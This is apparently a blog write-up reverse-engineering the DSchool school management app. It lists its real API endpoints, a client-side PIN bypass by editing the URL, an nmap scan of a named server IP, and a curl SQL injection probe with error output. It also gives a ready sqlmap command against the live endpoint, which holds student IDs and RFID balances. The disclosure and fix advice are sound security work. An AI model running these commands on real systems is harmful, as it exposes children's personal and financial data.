---
title: "How to own school management software in 3 easy(-ish) steps"
desc: "[Rewrite & Expanded] Story of unsanitized queries, privilege escalation and more."
date: 2023-10-29
tags: ["post", "cybersec", "writeup", "school"]
permalink: "/blog/school-management.html"
---

# How to own school management software in 3 easy(-ish) steps

---

## Preface

Original article was written over 2 years ago. These vulnerabilities have been reported. And (some) actions have been taken. Latest app is built on [Flutter](https://flutter.dev/) now.

Also I am not the first one who've discovered this. And for the final touch, educational purposes only. Some part might be replicable, some might not.

Actual rewrite date is 30th May 2026.

## App Overview

DSchool is a school services management app for student ID, attendance, **RFID card transaction records**, RFID cardcurrent balance *(it would be bad if the app is hackable, wouldn't it)*, notes of leaves and etc.

It also have on-site face recognition software to check student attendance. *yeahh..*

### Registeration

User enter their role (student / parent / teacher), their school name, **their identification number** and create **their own 6-digit pin**.

## Step 1: Recon

Dschool is available on IOS and Android. I chose Android's APK for [reverse engineering](https://en.wikipedia.org/wiki/Reverse_engineering). Since Android is **open-source** and so is .apk format. There are rich ecosystems of tools to decompile APK. 

*[VM]: Virtual Machine
I used **static analysis** method, also known as decompiling and looking thru generated code. I'll try to decompile first before jumping straight to Android VM.

### Sample APK

Archived APK: 

### APK Decompilation

My go-to decompiler is [JADX](https://github.com/skylot/jadx). But in this case [Apktool](https://apktool.org/) is viable too *(or even zip extractor)*.

After decompiling, looking thru generated files. There is `org.nativescript` folder. Indicating that this app was built with Javascript framework, [NativeScript](https://nativescript.org/).

After looking more, the `assets` folder stucks out. As it contains Javascript files with comments. We might have just found original source code of the app!

And once again, there is `tns_modules` which indicates a NativeScript project.


### API Endpoints Extraction

*[API]: Application Programming Interface
API Endpoints allow passing data between front-end app (Dschool) to the back-end (Server). There are specific formats / protocols you need to follow in order to obtain data. Common method is to use HTTP [REST](https://en.wikipedia.org/wiki/REST) architect API. 

*[Regex]: Regular Expression
So during [registeration](#registeration), We need to search for school name and identification numbers. There are at-least 1 API endpoint for these data.
I used Regex to extract URLs from source code folder.

## Step 2: Reverse Engineer

### (Modified) Source code snippets

Code snippets is aimed at highlighting logic, with glue code to receive input from UI. Even though snippets might seem valid, variables are not fully defined.

#### Sidebar

When you first open the app, you need to select user role. Selection menu is located at sidebar. Its code is located at `shared/BasePage.js`.

*[UI]: User Interface
If you look at the UI file `shared/widgets/drawer-content.xml`. You'll notice that there are role selection. With each label run `navigate` function on click.

```js
// shared/BasePage.js
BasePage.prototype.navigate = function(args) {
    var pageName = args.view.page0.toLowerCase(); // ListMenu input
    if (pageName == "student") { jojo1 = "s"; }
    else if (pageName == "parent") { jojo1 = "p"; }
    else if (pageName == "teacher") { jojo1 = "t"; }
    else if (pageName == "manager") { jojo1 = "m"; }
    // ...
    
    var sdno0 = {
        datatype: pref0.DataTypes.STRING,
        prefname: jojo1 + "sdno"
    };
    // ...
    if (pref0.GetPreference(sdno0) != null) {
        /* Translated code comment: Already registered */
        /* set app preference */
        link_page = "pages/home/home";
    }else { linkpage = "pages/findschool/findschool"; }
    // ...
    
    var naviGoto = {
        moduleName: link_page,
        content: {
            param1: jojo1,
            param2: ''
        }
        // ...
    };
}
```

So first, when Label is tapped. `navigate` is called, with Label object for `args`. And it sets `jojo1` to different value.

Then it checks if `sdno0` preference exist. Since this is first time registering, It is null. After that it sets `link_page` to `pages/findschool/findschool`.

Then we navigate to `link_page` with `jojo1` variable passed. I will substitute `jojo1` with "user role" for the sake of clarity.

#### findschool

```js
// pages/findschool/findschool.js
HomePage.prototype.findsc = function() {
    let schx = page.getViewById("sch"); // school name Textbox
    let mytext = encodeURIComponent(schx.txt);

    let url = "http://www.thaidigitalschool.com/ios/findSchoolData2.php?school_name=" + mytext;

    fetchModule.fetch(url, {
    }).then(r => r.json())
    .then(jsonData => {
        var navigationEntry1 = {
            moduleName: 'pages/school/school',
            context: {
                param1: gotData.param1, // user role
                param2: schx.text, // school name
                param3: jsonData
            }
        }
        // ...
    });
    // ...
}
```

User inputs their school name inside TextBox with id `sch`. Then text is later [Percent-encoded](https://en.wikipedia.org/wiki/Percent-encoding), and append to URL.

It makes a GET (no method given, GET is implied) request to query for the list of schools that include input substring.
Since returned list of schools contains input. Therefor you can search *nearly* every school, by using the word "School" *(in Thai obv)*

*[JSON]: JavaScript Object Notation
Then it navigates to `pages/school/school` with user role, school name, and JSON data passed.

Example response from endpoint
```json
{
    "ok": true,
    "school": [
        { "schoolid": "xxxxxxxx", "schoolname": "xxxxxxxxx" }
    ]
}
```

#### school

```js
// pages/school/school.js
HomePage.prototype.pageLoaded = function(args) {
    // ...
    pageData.schoollist = gotData.param3.school; // aka. JSON from findschool.js
    // ...
}

// ...

HomePage.prototype.schoolselect = function(args) {
    var itemIndex = args.index; // index of item in list
    var list = pageData.get('schoollist') // school list

    let scid = JSON.stringify(list[itemIndex].schoolid); // then remove quotes
    // ...
    var naviGoto = {
        moduleName: 'pages/finduser/finduser',
        context: {
            param1: gotData.param1, // user role
            param2: scid // school ID
        }
    }
    // ...
}
```

Next page shows the list of schools that contains input substring in it. User selects their school.

On page load, `pageData` is set to JSON data from `findschool.js`. Next, it navigates to `pages/finduser/finduser` with user role and school ID passed.
`scid` is set to school ID, from aforementioned JSON response.

#### finduser

```js
// pages/finduser/finduser.js
HomePage.prototype.findstudent = function(args) {
    let sdidx = page.getViewById("sdid"); // identification number input
    let sccode = gotData.param2; // school ID
    
    let url = "";
    if (gotData.param1 == "s" || gotData.param1 == "p") { // check user role
        url = "http://www.thaidigitalschool.com/school_service2/get_catstudent3.php?servername=" + sccode + "&sdno" + sdidx.text;
    }else {
        url = "http://thaidigitalschool.com/ios/findteacherData2.php?servername="+ sccode + "&sdno=" + sdidx.text;
    }

    fetchModule.fetch(url, {

    }).then(r => r.json())
    .then(jsonData => {
        // ...
        var naviGotox = {
            moduleName: 'pages/sregis/sregis',
            context: {
                param1: gotData.param1, // user role
                param2: gotData.param2, // school ID
                param3: jsonData["school"][0]["sdno"], // student number
                param4: jsonData["school"][0]["sdname"], // student (first) name
                param5: jsonData["school"][0]["sdsurname"] // student surname
            }
            // ...
        }
    })
}
```

User enters their identification number. The app makes GET request to query user with given identification number.
`sdidx` is set to identification number TextBox.

Then it navigates to `pages/sregis/sregis` with user role, school ID, student number, name and surname.

#### sregis

```js
// pages/sregis/sregis.js
function registerTap (args) {
    var regId = {
        datatype: pref.DataTypes.STRING,
        prefname: "regId"
    }
    var token = pref.GetPreference(regId); // Unknown for now
    registerdb();
}

function registerdb (aggs) {
    // ...
    setPref();
}

function setPref() {
 // ...
    // ...
    var myIdx = page.getViewById("myId");
    var myNamex = page.getViewById("myName");
    var mySurnamex = page.getViewById("mySurname");
    var mySchoolx = page.getViewById("myschool");
    // ...
    var name = {
        datavalue: myNamex.text + " " + mySurnamex.text,
        datatype: pref.DataTypes.STRING,
        prefname: "name"
    }
    var sdno = {
        datavalue: myIdx.text,
        datatype: pref.DataTypes.STRING,
        prefname: "sdno"
    }
    var schoolid = {
        datavalue: mySchoolx.text,
        datatype: pref.DataTypes.STRING,
        prefname: "schoolid"
    }
    var app = {
        datavalue: gotData1.param1,
        datatype: pref.DataTypes.STRING,
        prefname: "app"
    }
    pref.SavePreference(name);
    pref.SavePreference(sdno);
    pref.SavePreference(schoolid);
    pref.SavePreference(app);
    // ...
    var sdno0 = {
        datavalue: myIdx.text,
        datatype: pref.DataTypes.STRING,
        prefname: gotData.param1 + "sdno"
    }
    pref.SavePreference(sdno0);
    // ...
    var naviGoto = {
        moduleName: 'pages/home/home',
        // ...
    }
}


```

In this page, user is asked to confirm that the displayed identity is correct. Tapping the confirmation button triggers `registerTap`.

This code sits between `home` and `finduser`. Data are read from / write to preference using [`nativescript-android-preferences`](https://github.com/elsamrodco/nativescript-android-preferences). Preferences allow application to store and read configuration data. Preference is declared and written, to be read in home page.

#### home

Home sweet home.

```js
// pages/home/home.js
var latitude = "0"; // assume we deny GPS
var longitude = "0"; // assume we deny GPA

HomePage.prototype.pageLoaded = function(args) {
    // ...
    firstloadfin(args);
}

function firstloadfin(args) {
    // ...
    getRegisData();
    jojo1();
}

function getRegisData() {
    var regId = {
        datatype: pref.DataTypes.STRING,
        prefname: "regId"
    }
    var sdno = {
        datatype: pref.DataTypes.STRING,
        prefname: "sdno"
    }
    var schoolid = {
        datatype: pref.DataTypes.STRING,
        prefname: "schoolid"
    }
    var app = {
        datatype: pref.DataTypes.STRING,
        prefname: "app"
    }
    _app = pref.GetPreference(app);
    _schoolid = pref.GetPreference(schoolid);
    _sdno = pref.GetPreference(sdno);
    _regId = pref.GetPreference(regId);
    // ...
    loadFirebase()
}

function loadFirebase() {
    firebase.init({
        // ...
        onPushTokenReceivedCallback: function(token) {
            var regId0 = {
                datavalue: token,
                datatype: pref.DataTypes.STRING,
                prefname: "regId"
            }

            pref.SavePreference(regId0);
        }
    })
    // ...
}

function jojo1() {
    // ...
    jojo2();
}

function jojo2() {
    if (platformModule.device.os == "Android") {
        _type = "a";
    }else {
        _type = "i";
    }
    // ...
    var link = "http://www.thaidigitalschool.com/ios/dschool_re.php?mobile_id=" + _regId + "&app=" _app + "&user_id=" + _sndo + "&school_id=" + _schoolid + "&gcm_regid=" + _regId + "&change_stat=1&type=" + _type + "&latitude=" + latitude + "&longitude=" + longitude;

    oWebViewInterface = new webViewInterfaceModule.WebViewInterface(webView, link);
}
```

After registering, User will get brought back to home page. Home page might ask user for geolocation data, just deny that.

At this point, The DSchool app is actually just a [WebView](https://en.wikipedia.org/wiki/WebView) that loads DSchool website. Meaning you can use DSchool on browser.

If you enter this URL to your browser, the target website hostname might be replaced with IP address instead[^1]. Or using [curl](https://curl.se/), It might return

```html
<!-- PAGE -->
<meta http-equiv='refresh' content='0; URL=http://[IP]/dschool_app_v2020/index.php?[MORE PARAMETER]'>
``` 

### Overall Map
![Map](/assets/img/content/school_management/trans.jpeg)

We have figured out all variables used to get to here. Now let's go to the next step.

## Step 3: Exploit!

After we've finished extensively reverse engineer the logic. What can we do with it?

Well, simplest one is changing your role from student to parent / teacher / manager. It allows you to access UI panel of that role[^2]. Although it's a bit wonky.

We had obtained IP address of the DSchool website, maybe we could do some port scanning?

### Password bypass

Snippet of 6-digit pin authentication code, located at home page. If you know JavaScript, you know.

```js
$.ajax({
    type: "POST",
    url: 'login_check.php',
    data: {
        userid: var_user_id,
        gcm_regid: var_gcm_regid,
        school_id: var_school_id
    },
    success: function(data) {
        console.log(data);
        if (data == 1) {
            window.location.href = '../main.php'
        }else {
            $("#clear").click();
            Swal.fire('รหัส PIN ไม่ถูกต้อง');
        }
    }
})
```

*It uhh..* So what this code does is. It makes a POST request to `123.45.67.89:80/dschool_app_v2020/login_check.php` with school ID and student ID as parameter. And check if it is correct.

**IF THIS IS CORRECT, it will change URL from `123.45.67.89:80/dschool_app_login/index.php` to `123.45.67.89:80/dschool_app_v2020/main.php`. Which there's NOTHING to prevent us from just changing the URL manually.**

*Oh* [Client-side authentication](https://cwe.mitre.org/data/definitions/603.html), why is it so hard to leave you~

!["NOTICE KEEP GATE CLOSED AND LOCKED" with authentication code attached to it](/assets/img/content/school_management/school_keep_lock.jpg)

### Port Scanning

Port scanning is software scanning for any open port on target. Open ports allow computers to communicate with each other. Using tool like [Nmap](https://nmap.org/). For example: [MySQL](www.mysql.com) opens port at 3306. Nmap can detect that MySQL is running, and possibly detect its version.

So let's try IP: 43\[.\]229\[.\]78\[.\]187 *(as it's the only IP I've tested)*

Using Nmap. It might return
```sh
nmap -sV 43.229.78.187
```

```sh
PORT     STATE  SERVICE
80/tcp   open   http        
3306/tcp open   mysql
3389/tcp open   ms-wbt-server
5985/tcp open   http
```

*[RDP]: Remote Desktop Protocol
The server have these following

 - Port 80 (HTTP): Expected port, since we're connecting to server with HTTP (not HTTPS)
 - Port 3306 (MySQL): Database port. Maybe we can dump data from here?
 - Port 3389 (Microsoft RDP): Remote Desktop port. Maybe we can ~~hack~~ remote to the server? *(Haven't tried yet)*
 - Port 5958 (WinRM): ??. Maybe helper service for RDP?

Since MySQL port open, maybe we can try [SQL injection](https://portswigger.net/web-security/sql-injection)?

### SQL Injection

SQL Injection injects SQL queries into unsanitized input form, allowing for example: dumping database. Let's try a basic test before using the big guns.

```sh
curl -k "http://www.thaidigitalschool.com/school_service2/get_catstudent3.php?servername=7777777777&sdno=1'"
```

It returns

```html
<br />
<b>Warning</b>: mysql_num_rows() expects parameter 1 to be resource, boolean given in
<b>C:\Apache24\htdocs\school_service2\get_catstudent3b.php</b> on line <b>36</b><br />
<br />
<b>Warning</b>: mysql_fetch_array expects parameter 1 to be resource, boolean given in
<b>C:\Apache24\htdocs\school_service2\get_catstudent3b.php</b> on line <b>43</b><br />
{"no":true,"school":[]}
```

So it is **vulnerable :3 !** Therefor we can query, dump, and takeover the database. Using tool like [SQLMap](https://sqlmap.org/) to assist in creating payload.

```sh
sqlmap -u "http://www.thaidigitalschool.com/school_service2/get_catstudent3.php?servername=7777777777&sdno=1" -p sdno
```

What data does it store?
 - Address
 - Identification number
 - RFID card number
 - Current balance
 - Student's behavioural score
 - Many more... *(there's a lot of school services after all)*

## Step 4: Profit??

*[XSS]: Cross-Site Scripting
### Vulnerability list found so far
 - SQL injection (from `school_service2/get_catstudent3.php`)
 - Client-side authentication (from `dschool_app_login/index.php`)
 - Insecure direct object reference (from `ios/dschool_re.php` `app` parameter)
 - XSS (from face recognition image, not significant)

There's also open RDP port, which I'm not qualify in this sector to tell you anything. If it's vulnerable, it's just [another mistake :3](https://www.youtube.com/watch?v=MzA77Ttl7V0).

### Input sanitization / Parameterized query

Input sanitization stop SQL injection from happening, by escaping special characters that can be intrepret as SQL Query. 

[Paramterized query](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html) uses placeholder to insert value instead of manipulating query string directly, preventing injection.

There's also [stackoverflow thread about this](https://stackoverflow.com/questions/60174/how-can-i-prevent-sql-injection-in-php).

### Client-Side authentication

DON'T! Just use backend. *(There's also weakness enumeration: [CWE-603](https://cwe.mitre.org/data/definitions/603.html))*

---

## PostScript / Rant

Y'know I'll take this, any day than Canva's site AI Slop. Canva generated sites are used in facility somewhat regularly to store students data *(not as much as DSchool but still)*.
Most people who use this tool don't know anything about security, so they don't know that this is a problem. And students trust the websites to be secure enough to enter their personal information there *(if they even have a choice to)*.

It does not take long to breach these. Longest time I took to breach Canva website is 30 mins. It's usually same mistake, Client-side authentication. In one case, it decided to put admin email and password in a function??

Anyway, Canva's AI site builder should be stripped from users, unless they can explain what a backend is. *(Unless, it's just interactive and no login website. Then I guess go ahead.)*

[^1]: **UPDATE**: It used to return IP specific server. Now it returns DSchool hostname. It was working 3 months ago.
[^2]: This used to work with early build of DSchool website.